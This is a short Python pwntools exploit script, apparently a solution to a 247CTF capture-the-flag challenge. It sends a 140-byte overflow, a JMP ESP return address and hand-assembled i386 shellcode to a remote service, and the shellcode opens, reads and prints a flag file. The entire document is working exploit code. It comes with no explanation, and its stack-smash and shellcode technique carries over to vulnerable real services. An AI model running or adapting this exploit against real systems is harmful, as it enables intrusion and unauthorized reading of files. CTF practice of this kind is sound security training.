#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

HOST = "66c58f9b4036976b.247ctf.com"
PORT = 50470

JMP_ESP = 0x080484b3
OFFSET = 140

def exploit():
    io = remote(HOST, PORT)
    
    # Shellcode: open/read/write flag_27886b9a498ed936.txt
    fname = b"flag_27886b9a498ed936.txt"
    padded = fname + b'\x00' * (4 - len(fname) % 4)
    chunks = [u32(padded[i:i+4]) for i in range(0, len(padded), 4)]
    
    sc = "xor eax, eax\npush eax\n"
    for c in reversed(chunks):
        sc += f"push {hex(c)}\n"
    sc += '''
        mov ebx, esp
        xor ecx, ecx
        mov al, 5
        int 0x80
        mov ebx, eax
        mov ecx, esp
        mov edx, 100
        xor eax, eax
        mov al, 3
        int 0x80
        mov edx, eax
        xor ebx, ebx
        inc ebx
        mov al, 4
        int 0x80
    '''
    
    shellcode = asm(sc)
    payload = b'A' * OFFSET + p32(JMP_ESP) + shellcode
    
    io.recvline()
    io.sendline(payload)
    print(io.recvall(timeout=3).decode())

if __name__ == "__main__":
    exploit()
